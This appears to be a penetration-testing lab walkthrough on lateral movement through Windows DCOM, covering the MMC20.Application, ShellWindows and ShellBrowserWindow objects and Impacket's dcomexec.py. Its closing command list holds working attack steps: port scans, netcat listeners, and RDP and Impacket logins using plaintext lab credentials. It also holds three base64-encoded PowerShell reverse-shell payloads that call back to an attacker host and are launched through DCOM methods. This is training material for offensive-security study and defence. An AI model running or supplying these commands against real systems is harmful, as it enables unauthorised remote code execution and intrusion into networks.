## Distributed Component Object Model (DCOM) 

### Lateral Movement with DCOM 

[Distributed Component Object Model](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0) (DCOM) is a Microsoft technology for software components distributed across networked computers. It extends the Component Object Model (COM) to support communication among objects over a network. It operates on top of the remote procedure call (RPC) transport protocol based on TCP/IP for its network communications. **DCOM uses Port 135 for the initial communication and dynamic ports in the range 49152-65535** for subsequent client-server interactions. Information about the identity, implementation, and configuration of **each DCOM object is stored in the registry**, linked to several key identifiers: 

- **CLSID (Class Identifier)**: A unique GUID for a COM class, pointing to its implementation in the registry via **InProcServer32** for DLL-based objects or **LocalServer32** for executable-based objects. 

- **ProgID (Programmatic Identifier)**: An optional, user-friendly name for a COM class, used as an alternative to the CLSID, though it is not unique and not always present. 

- **AppID (Application Identifier)**: Specifies configuration details for one or more COM objects within the same executable, including permissions for local and remote access. 


### DCOM Rights


Leveraging **DCOM** for lateral movement requires specific user rights and permissions. These rights ensure that users have the appropriate level of access to perform DCOM operations securely. These include general user rights such as **local and network access**, which enable communication with DCOM services locally and over a network. Additionally, **membership in the Distributed COM Users group or the Administrators group is often required**, as these groups have the necessary permissions. These settings are typically managed using the **DCOM Configuration Tool (DCOMCNFG), Group Policy, or the Windows Registry**. 


### DCOM Enumeration 


Before we begin working with **DCOM** we must verify whether it is running on the target host, as we already know this service uses port **TCP 135 for communication and dynamic ports in the range 49152-65535** for subsequent client-server interactions. We can use NMAP to scan the target and identify DCOM. 

![DCOM](/Distributed-Component-Object-Model/images/nmap.png) 

### Lateral Movement from Windows 

- Lateral movement from a Windows system can be achieved by performing several techniques with **DCOM objects**, here we will be implementing **MMC20, ShellWindows, and ShellBrowserWindows**. 


#### MMC20.Application

- The **MMC20.Application** object allows remote interaction with **Microsoft Management Console (MMC)**, enabling us to execute commands and manage administrative tasks on a Windows system through its graphical user interface components.

- To use this technique, first let's start listening with Netcat on our attack host: 

![DCOM](/Distributed-Component-Object-Model/images/netcat.png) 


- Let's connect via RDP to **SRV01** using Helen's credentials. 

![DCOM](/Distributed-Component-Object-Model/images/rdp.png) 

- Now, we must create an instance of the **MMC20.Application object**. This is done using PowerShell to interact with COM objects. Here's the command we use:

![DCOM](/Distributed-Component-Object-Model/images/mmc.png) 

- We create an instance of the **MMC20.Application COM** object on our target server SRV02 using PowerShell. We declare a variable $mmc to store this instance and use the **.NET Activator class's CreateInstance** method to initialize it. The **GetTypeFromProgID method retrieves the type information for the MMC20.Application based on its ProgID, "MMC20.Application", from the remote server at 172.20.0.52**. 

- Next, we can utilize the **ExecuteShellCommand** function within the **Document.ActiveView** property. [Microsoft documentation](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/mmc/view-executeshellcommand) defines the method as follows: 

```
Code ### 

View.ExecuteShellCommand( _
  ByVal Command As String, _
  ByVal Directory As String, _
  ByVal Parameters As String, _
  ByVal WindowState As String _
)
```

- In order to use it, we must complete all parameters. The first is the **Command to execute, which will be powershell.exe**, next we set the **Directory to $null**, 3rd we add PowerShell's parameters with our **reverse shell payload**, we will use a payload from https://www.revshells.com, and finally we set the WindowState to 0 so it will execute normally: 

![DCOM](/Distributed-Component-Object-Model/images/mmc-2.png) 

![DCOM](/Distributed-Component-Object-Model/images/shell.png) 

- Execution of **mmc.exe through COM is highly unusual**, making it difficult to mask this technique as benign activity and likely to trigger alerts for defenders, but that will depend on the maturity of the organization. 


### ShellWindows & ShellBrowserWindow 

[ShellWindows](https://learn.microsoft.com/en-us/windows/win32/shell/shellwindows?redirectedfrom=MSDN) and **ShellBrowserWindow** objects in DCOM are very similar, they facilitate remote interaction with Windows Explorer instances. ShellWindows allows enumeration and control of open windows, enabling operations such as accessing files and executing commands within the Windows shell environment. However, ShellBrowserWindow provides specific control over browser windows within Windows Explorer, offering capabilities for managing file operations and executing commands remotely.

Since these objects aren't associated with a **ProgID**, we must employ the **Type.GetTypeFromCLSID method in .NET along with Activator.CreateInstance to create an instance of the object via its CLSID** on a remote host. We can find the CLSID with the following script: 

![DCOM](/Distributed-Component-Object-Model/images/clsid.png) 

- CLSID
> {9BA05972-F6A8-11CF-A442-00A0C90A8F39} 


### Lateral Movement from Linux

To perform **DCOM** lateral movement from Linux systems we must use the [Impacket](https://github.com/fortra/impacket) toolset which is a suite of Python libraries designed for interacting with network protocols. In this section, we will be using [dcomexec.py](https://github.com/fortra/impacket/blob/master/examples/dcomexec.py). 


#### dcomexec.py 

**dcomexec.py** from Impacket provides an interactive shell on a remote Windows host, similar to **wmiexec.py**, but utilizes different DCOM endpoints for command execution. **It operates over TCP port 445, retrieving output via the ADMIN$ share**. This tool supports **DCOM objects like MMC20.Application, ShellWindows, and ShellBrowserWindow**, offering alternative remote execution methods. 

We can leverage dcomexec.py to connect to a remote host and get code execution. Let's start a listener with Netcat: 

![DCOM](/Distributed-Component-Object-Model/images/impacket.png) 

![DCOM](/Distributed-Component-Object-Model/images/shell-2.png) 


### DCOM Commands Windows / Linux 

```

$ nmap -p135,49152-65535 10.129.229.244 -sCV -Pn 

$ rlwrap nc -nlvp 8001 

$ xfreerdp /v:10.129.229.244 /u:helen /p:RedRiot /dynamic-resolution /cert:ignore +clipboard +auto-reconnect /d:inlanefreight /drive:kali,/home/kali/Tools 

PS C:\Tools> $mmc = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","172.20.0.52"));

PS C:\Tools> $mmc.Document.ActiveView.ExecuteShellCommand("powershell.exe",$null,"-e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQA0ADkAIgAsADgAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA",0) 

PS C:\Tools> Get-ChildItem -Path 'HKLM:\SOFTWARE\Classes\CLSID' | ForEach-Object{Get-ItemProperty -Path $_.PSPath | Where-Object {$_.'(default)' -eq 'ShellWindows'} | Select-Object -ExpandProperty PSChildName} 

PS C:\Tools> $shell = [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","SRV02")) 

PS C:\Tools> $shell = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","172.20.0.52")) 

$ rlwrap nc -nlvp 8001

PS C:\Tools> $shell[0].Document.Application.ShellExecute("cmd.exe","/c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQA0ADkAIgAsADgAMAA4ADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","C:\Windows\System32",$null,0) 

$ rlwrap nc -nlvp 8080 

$ proxychains4 -q impacket-dcomexec -object MMC20 inlanefreight/Josias:Jonny25@172.20.0.52 "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQA0ADkAIgAsADgAMAA4ADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA" -silentcommand 

```


